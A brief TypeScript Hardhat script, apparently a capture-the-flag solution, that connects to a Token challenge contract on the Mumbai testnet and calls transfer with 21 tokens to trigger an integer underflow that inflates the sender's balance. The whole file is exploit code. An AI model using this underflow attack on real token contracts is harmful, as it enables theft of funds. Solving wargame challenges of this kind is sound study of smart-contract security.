import { ethers } from 'hardhat'
import { Token__factory } from '../typechain'

import { config } from '../secrets.config'

const MUMBAI_RPC = 'https://rpc-mumbai.maticvigil.com'
const provider = new ethers.providers.JsonRpcProvider(MUMBAI_RPC)

const myAcc = '0x666e416d73609f61C60d8A844066A0d956805118'
const instanceAddr = '0x35F391eCc01109c59079d2EEb39c9a18d9276812'

async function hack() {
  const signer = new ethers.Wallet(config.PRIVATE.MAIN[0], provider)
  const contractInstance = Token__factory.connect(instanceAddr, signer)
  await (await contractInstance.transfer(instanceAddr, 21)).wait()
  console.log(await (await contractInstance.balanceOf(myAcc)).toString());
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
